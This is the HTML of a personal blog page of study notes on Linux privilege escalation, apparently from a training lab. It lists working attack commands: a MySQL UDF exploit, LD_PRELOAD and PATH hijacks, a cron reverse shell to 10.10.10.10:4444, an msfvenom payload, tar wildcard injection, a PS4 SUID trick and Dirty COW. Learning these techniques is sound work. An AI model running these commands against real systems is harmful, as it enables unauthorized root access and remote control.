@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/rainou/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=rainou/livereload" data-no-instant defer></script>
+  <title>
+  Privilege Escalation · Rain Notes
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Rain Ou">
+<meta name="description" content="
+  Privilege Escalation
+  
+    
+    Link to heading
+  
+
+
+Tools: LinEnum - Privesc
+Always include a check list of what to try
+Commands to remember:
+
+id show the current user priviledge
+Sudo -l: show what command can be run as root user
+[command] -p run with root priviledge
+
+
+Methods:
+
+Abusing SUID/GUID
+rewrite: /etc/passwd
+
+Vi editor: if it has been misconfigured run vi as sudo, then sudo vi
+
+
+Misconfigured Binaries and GTFOBins
+Crontab: cat /etc/crontab
+Path variable: abuse the SUID binary and the system shell to run an executable
+
+export PATH=[directory]:$PATH
+access root shell using the system PATH by &ldquo;imitating a bash shell&rdquo;
+
+create a fake &rsquo;ls&rsquo; file (which bash shell as content) and add to the path
+when real ls is needed, they can be accessed via bin/ls
+
+
+
+
+More
+
+Linux Privilege Escalation
+payload all the thing - privesc
+OSCP privesc
+
+
+
+
+
+
+  Service Exploits
+  
+    
+    Link to heading
+  
+
+
+Use User defined function (UDF) exploit to run system commands as root via the MySQL service
+
+This exploit takes the advantages of the MySQL service running as root and the &ldquo;root&rdquo; user for the service does not have a password assigned
+
+
+Steps:
+
+download exploit &ldquo;mysql-udf&rdquo;
+Compile the raptor_udf2.c exploit code
+
+
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc">
+<meta name="keywords" content="notes,cybersecurity,music,share">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Privilege Escalation">
+  <meta name="twitter:description" content="Privilege Escalation Link to heading Tools: LinEnum - Privesc Always include a check list of what to try Commands to remember: id show the current user priviledge Sudo -l: show what command can be run as root user [command] -p run with root priviledge Methods: Abusing SUID/GUID rewrite: /etc/passwd Vi editor: if it has been misconfigured run vi as sudo, then sudo vi Misconfigured Binaries and GTFOBins Crontab: cat /etc/crontab Path variable: abuse the SUID binary and the system shell to run an executable export PATH=[directory]:$PATH access root shell using the system PATH by “imitating a bash shell” create a fake ’ls’ file (which bash shell as content) and add to the path when real ls is needed, they can be accessed via bin/ls More Linux Privilege Escalation payload all the thing - privesc OSCP privesc Service Exploits Link to heading Use User defined function (UDF) exploit to run system commands as root via the MySQL service This exploit takes the advantages of the MySQL service running as root and the “root” user for the service does not have a password assigned Steps: download exploit “mysql-udf” Compile the raptor_udf2.c exploit code gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc">
+
+<meta property="og:url" content="http://localhost:1313/rainou/cyber/privilege-escalation/">
+  <meta property="og:site_name" content="Rain Notes">
+  <meta property="og:title" content="Privilege Escalation">
+  <meta property="og:description" content="Privilege Escalation Link to heading Tools: LinEnum - Privesc Always include a check list of what to try Commands to remember: id show the current user priviledge Sudo -l: show what command can be run as root user [command] -p run with root priviledge Methods: Abusing SUID/GUID rewrite: /etc/passwd Vi editor: if it has been misconfigured run vi as sudo, then sudo vi Misconfigured Binaries and GTFOBins Crontab: cat /etc/crontab Path variable: abuse the SUID binary and the system shell to run an executable export PATH=[directory]:$PATH access root shell using the system PATH by “imitating a bash shell” create a fake ’ls’ file (which bash shell as content) and add to the path when real ls is needed, they can be accessed via bin/ls More Linux Privilege Escalation payload all the thing - privesc OSCP privesc Service Exploits Link to heading Use User defined function (UDF) exploit to run system commands as root via the MySQL service This exploit takes the advantages of the MySQL service running as root and the “root” user for the service does not have a password assigned Steps: download exploit “mysql-udf” Compile the raptor_udf2.c exploit code gcc -g -c raptor_udf2.c -fPIC gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cyber">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/rainou/cyber/privilege-escalation/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/rainou/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/rainou/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/rainou/">
+      Rain Notes
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/cyber/">Cyber</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/music/">Music</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/rainou/cyber/privilege-escalation/">
+          Privilege Escalation
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>Tools: LinEnum - Privesc</li>
+<li>Always include a check list of what to try</li>
+<li>Commands to remember:
+<ul>
+<li><code>id</code> show the current user priviledge</li>
+<li><code>Sudo -l</code>: show what command can be run as root user</li>
+<li><code>[command] -p</code> run with root priviledge</li>
+</ul>
+</li>
+<li>Methods:
+<ul>
+<li>Abusing SUID/GUID</li>
+<li>rewrite: <code>/etc/passwd</code>
+<ul>
+<li>Vi editor: if it has been misconfigured run vi as sudo, then <code>sudo vi</code></li>
+</ul>
+</li>
+<li><a href="https://gtfobins.github.io/"  class="external-link" target="_blank" rel="noopener">Misconfigured Binaries and GTFOBins</a></li>
+<li>Crontab: <code>cat /etc/crontab</code></li>
+<li>Path variable: abuse the SUID binary and the system shell to run an executable
+<ul>
+<li><code>export PATH=[directory]:$PATH</code></li>
+<li>access root shell using the system PATH by &ldquo;imitating a bash shell&rdquo;
+<ul>
+<li>create a fake &rsquo;ls&rsquo; file (which bash shell as content) and add to the path</li>
+<li>when real ls is needed, they can be accessed via <code>bin/ls</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>More
+<ul>
+<li><a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md"  class="external-link" target="_blank" rel="noopener">Linux Privilege Escalation</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"  class="external-link" target="_blank" rel="noopener">payload all the thing - privesc</a></li>
+<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html"  class="external-link" target="_blank" rel="noopener">OSCP privesc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="service-exploits">
+  Service Exploits
+  <a class="heading-link" href="#service-exploits">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Use <a href="https://www.exploit-db.com/exploits/1518"  class="external-link" target="_blank" rel="noopener">User defined function (UDF) exploit</a> to run system commands as root via the MySQL service
+<ul>
+<li>This exploit takes the advantages of the MySQL service running as root and the &ldquo;root&rdquo; user for the service does not have a password assigned</li>
+</ul>
+</li>
+<li>Steps:
+<ul>
+<li>download exploit &ldquo;mysql-udf&rdquo;</li>
+<li>Compile the raptor_udf2.c exploit code</li>
+</ul>
+<blockquote>
+<p>gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</p>
+</blockquote>
+<ul>
+<li>Connect to the MySQL service as the root user with a blank password:</li>
+</ul>
+<blockquote>
+<p>mysql -u root</p>
+</blockquote>
+<ul>
+<li>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) &ldquo;do_system&rdquo; using our compiled exploit:</li>
+</ul>
+<blockquote>
+<p>use mysql;
+create table foo(line blob);
+insert into foo values(load_file(&rsquo;/home/user/tools/mysql-udf/raptor_udf2.so&rsquo;));
+select * from foo into dumpfile &lsquo;/usr/lib/mysql/plugin/raptor_udf2.so&rsquo;;
+create function do_system returns integer soname &lsquo;raptor_udf2.so&rsquo;;</p>
+</blockquote>
+<ul>
+<li>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</li>
+</ul>
+<blockquote>
+<p>select do_system(&lsquo;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&rsquo;);</p>
+</blockquote>
+<ul>
+<li>Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</li>
+</ul>
+<blockquote>
+<p>/tmp/rootbash -p</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="weak-file-permission">
+  Weak file permission
+  <a class="heading-link" href="#weak-file-permission">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="readable-etcshadow">
+  Readable /etc/shadow
+  <a class="heading-link" href="#readable-etcshadow">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Normally readable only by the root user.</li>
+<li>take the hash in the shadow file and crack it.</li>
+<li>e.g. <code>root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</code>
+<ul>
+<li>hash: <code>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="writable-etcshadow">
+  Writable /etc/shadow
+  <a class="heading-link" href="#writable-etcshadow">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Generate a new password and replace with the root password in the shadow file
+<ul>
+<li><code>mkpasswd -m sha-512 newpasswordhere</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="writable-etcpasswd">
+  Writable /etc/passwd
+  <a class="heading-link" href="#writable-etcpasswd">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Replace root password: Generate a new password and replace with the root password in the passwd file
+<ul>
+<li><code>openssl passwd newpasswordhere</code></li>
+</ul>
+</li>
+<li>Create new root user: copy the root row to the bottom and add hash password of the choice</li>
+</ul>
+<h2 id="sudo">
+  Sudo
+  <a class="heading-link" href="#sudo">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="shell-escape-sequence">
+  Shell escape sequence
+  <a class="heading-link" href="#shell-escape-sequence">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Use the users limited root priviledge to gain access to the root shell (use <code>Sudo -l</code>)</li>
+<li>Command and methods are listed here: <a href="https://gtfobins.github.io/"  class="external-link" target="_blank" rel="noopener">GTFOBins</a></li>
+</ul>
+<h3 id="enviroment-variables">
+  Enviroment variables
+  <a class="heading-link" href="#enviroment-variables">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><code>Sudo -l</code> can see the current user enviroment variable</li>
+<li><code>LD_PRELOAD</code> and <code>LD_LIBRARY_PATH</code> are both inherited from the user&rsquo;s environment
+<ul>
+<li><code>LD_PRELOAD</code> loads a shared object before any others when a program is run.
+<ul>
+<li><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</code>
+<ul>
+<li><code>preload.c</code> is the payload</li>
+<li><code>sudo LD_PRELOAD=/tmp/preload.so [any sudo -l program]</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>LD_LIBRARY_PATH</code> provides a list of directories where shared libraries are searched for first
+<ul>
+<li><code>ldd /usr/sbin/apache2</code> see which shared libraries are used by the program</li>
+<li><code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</code>
+<ul>
+<li>Create a shared object with the same name as one of the listed libraries</li>
+<li><code>library_path.c</code> is the payload</li>
+<li><code>sudo LD_LIBRARY_PATH=/tmp apache2</code> set the <code>LD_LIBRARY_PATH</code> to where our output is</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="cron-jobs">
+  Cron Jobs
+  <a class="heading-link" href="#cron-jobs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>replace the original shell with reverse shell payload</li>
+<li>Take advantages of the wildcard, wether in script or out of script</li>
+<li>File permission</li>
+</ul>
+<blockquote>
+<p>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</p>
+</blockquote>
+<ul>
+<li>PATH enviroment variables
+<ul>
+<li>Note that the <code>/home/user</code> in the path takes precedence, if we create the same filename in the home directory, this will take precedence</li>
+</ul>
+</li>
+<li>Wildcard
+<ul>
+<li><code>tar</code> command has checkpoint in case of failure, use filename as command and feed it to <code>tar</code> can makes a payload to run</li>
+</ul>
+<blockquote>
+<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+chmod +x /home/user/shell.elf</p>
+<h1 id="target-machine">
+  Target machine
+  <a class="heading-link" href="#target-machine">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h1 id="have-shellelf-file">
+  have shell.elf file
+  <a class="heading-link" href="#have-shellelf-file">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>touch /home/user/&ndash;checkpoint=1
+touch /home/user/&ndash;checkpoint-action=exec=shell.elf</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="suidguid">
+  SUID/GUID
+  <a class="heading-link" href="#suidguid">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="known-exploits">
+  Known exploits
+  <a class="heading-link" href="#known-exploits">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Find all files with SUID/GUID on the system: <code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code></li>
+<li>if found some known exploit, such as <code>exim-4.84-3</code> in this case, the exploit can be found on the exploit databases</li>
+</ul>
+<h3 id="shared-object-injection">
+  shared object injection
+  <a class="heading-link" href="#shared-object-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Use the object path that a certain command is using, let the command run and call that object
+<ul>
+<li>e.g. <code>/usr/local/bin/suid-so</code> command</li>
+<li>Trace what this command is calling <code>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</code></li>
+<li>Make directory <code>mkdir /home/user/.config</code></li>
+<li>compile an object (which returns a bash shell) with the same name <code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</code></li>
+<li>Run the command again <code>/usr/local/bin/suid-so</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="enviroment-variables-1">
+  Enviroment Variables
+  <a class="heading-link" href="#enviroment-variables-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>See how a service is started<code>strings /usr/local/bin/suid-env</code>, this shows that it will call <code>service apache2 start</code> to start the service</li>
+<li>we can fake &ldquo;service&rdquo; command if service is not using an absolute path</li>
+<li><code>gcc -o service /home/user/tools/suid/service.c</code> use the payload and create a file that has the same &ldquo;service&rdquo; name</li>
+<li>Prepend the path to the variable before it reaches the true path <code>PATH=.:$PATH /usr/local/bin/suid-env</code></li>
+</ul>
+<h3 id="abusing-shell-feature-1">
+  Abusing shell feature #1
+  <a class="heading-link" href="#abusing-shell-feature-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Bash version &lt;4.2-048 can accept function name to be named like a path name:</li>
+<li>e.g. in the bash version, we can name a function with name of  <code>/usr/sbin/service</code>, which takes prcedence of the service command</li>
+</ul>
+<blockquote>
+<p>function /usr/sbin/service { /bin/bash -p; } # create the function with specified path name
+export -f /usr/sbin/service # add this function to the enviroment</p>
+</blockquote>
+<ul>
+<li>When the command with <code>/usr/sbin/service</code> is run, this function is being called</li>
+<li>Step by step example: if <code>/usr/local/bin/suid-env2</code> has SUID/SGID set:</li>
+</ul>
+<blockquote>
+<p>strings /usr/local/bin/suid-env2
+/bin/bash &ndash;version
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2</p>
+</blockquote>
+<h3 id="abusing-shell-feature-2">
+  Abusing shell feature #2
+  <a class="heading-link" href="#abusing-shell-feature-2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Not work on Bash versions 4.4 and above.</li>
+<li>When in debugging mode, the environment variable <code>PS4</code> can display an extra prompt for debugging</li>
+<li>run <code>/usr/local/bin/suid-env2</code> + debugging enabled + PS4 enviroment variable embedded SUID paylaod
+<ul>
+<li><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</code></li>
+<li><code>/tmp/rootbash -p</code> run the root that was created by PS4</li>
+</ul>
+</li>
+</ul>
+<h2 id="password-and-keys">
+  Password and Keys
+  <a class="heading-link" href="#password-and-keys">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="history-files">
+  History files
+  <a class="heading-link" href="#history-files">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>review the history file that might contain the password mistyped on the command line</li>
+<li>view content of the hiddent history <code>cat ~/.*history | less</code></li>
+</ul>
+<h3 id="config-files">
+  Config files
+  <a class="heading-link" href="#config-files">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Some of the configuration file might include an authentication password in another address</li>
+</ul>
+<h3 id="ssh-keys">
+  SSH Keys
+  <a class="heading-link" href="#ssh-keys">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Double check if there is a backup ssh file key with mis configured permission, use that to connect to the machine</li>
+<li><code>ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.152.118</code></li>
+</ul>
+<h2 id="nfs">
+  NFS
+  <a class="heading-link" href="#nfs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Files created via NFS inherit the remote user&rsquo;s ID</li>
+<li>ID set to the &ldquo;nobody&rdquo; user = if user is root + root squashing is enabled</li>
+<li><code>cat /etc/exports</code> see if any no_root_squash set</li>
+<li>Example step
+<ul>
+<li>Mount the nfs share on the host
+<ul>
+<li><code>mkdir /tmp/nfs</code></li>
+<li><code>mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs</code></li>
+</ul>
+</li>
+<li>Upload a payload that runs bash shell + update permission
+<ul>
+<li><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code></li>
+<li><code>chmod +xs /tmp/nfs/shell.elf</code></li>
+</ul>
+</li>
+<li>On the target machine, run the uploaded file <code>shell.elf</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="kernel-exploits">
+  Kernel Exploits
+  <a class="heading-link" href="#kernel-exploits">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Kernel exploits can leave the system in an unstable state, ONLY run them as a last resort.</li>
+<li>&ldquo;Linux Exploit Suggester 2&rdquo;
+<ul>
+<li>identify potential kernel exploits on the current system</li>
+<li><code>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</code>
+<ul>
+<li>One of the exploit is &ldquo;Dirty COW&rdquo;: It replaces the SUID file <code>/usr/bin/passwd</code> with one that spawns a shell</li>
+</ul>
+</li>
+<li>This command run the exploit</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w</p>
+</blockquote>
+<ul>
+<li>Once complete run <code>/usr/bin/passwd</code></li>
+</ul>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2025 -
+    
+    2026
+     Rain Ou 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/rainou/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
